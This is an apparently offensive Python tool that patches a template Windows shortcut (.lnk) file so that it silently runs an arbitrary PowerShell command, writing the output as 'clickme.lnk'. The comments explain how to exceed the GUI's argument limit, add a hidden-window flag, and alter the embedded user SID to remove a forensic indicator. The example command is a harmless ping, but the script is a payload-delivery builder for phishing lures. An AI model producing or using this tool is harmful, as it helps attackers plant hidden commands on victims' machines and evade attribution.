#!/usr/bin/python3
import sys

#This Python3 script is designed to take a template .lnk file and patch in a user-defined command.  
#Making a .lnk through the Windows GUI limits the "target" field to 259 characters (the target binary AND arguments)
#This is a constraint of the GUI/explorer; .lnk's can support far longer arguments!

#Usage: Python3 genlnk.py template.lnk

#IOC's:
#The template .lnk file included with this is from a Win7 VM; it was generated using a powershell script.
#.lnk's seem to embed the SID of the user that generated them; this is visible by running xxd <file.lnk>
#Consider modifying this script to patch/change the SID in the template file :)

#Comments
#If you want to add -w hidden to the powershell command, swap the $Shortcut.Argument variables in Template_generator.ps1 and then adjust lines 25 and 35 in this script as noted.

#Command to be stored in .lnk. Make sure you use escape characters as necessary for Python!
command = '"ping 192.168.1.150 -n 3"'

#Get length of above command, plus "-c "(or plus "-w 1 -c ")
lengthCommand = len(command) + 3 #-w 1: lengthCommand = len(command) + 8

#Read in .lnk template.  Template file contains powershell as target and is pre-seeded with '-c ""'.  Above command will replace the "".
with open(sys.argv[1], 'rb') as f:
    s = f.read()
f.close()

# '\x22\x00\x22\x00' represents the "" pre-seed we are going to search for and replace. Because it's UTF-16 there are null bytes inbetween the characters.

#subtract 8(or 18) from location of byte pattern to locate bytes that represents length of args
locLenByte = s.find(b'\x22\x00\x22\x00') - 8 #-w 1: locLenByte = s.find(b'\x22\x00\x22\x00') - 18

#Patch in correct length byte.
s = s[:locLenByte] + lengthCommand.to_bytes(2, byteorder='little') + s[locLenByte + 2:]

#replace '".".' with command
s = s.replace(b'\x22\x00\x22\x00', bytes(command, 'UTF-16'))

#strip out encoding header
s = s.replace(b'\xff\xfe', b'')

#write file
with open("clickme.lnk", 'wb') as f:
    f.write(s)
f.close
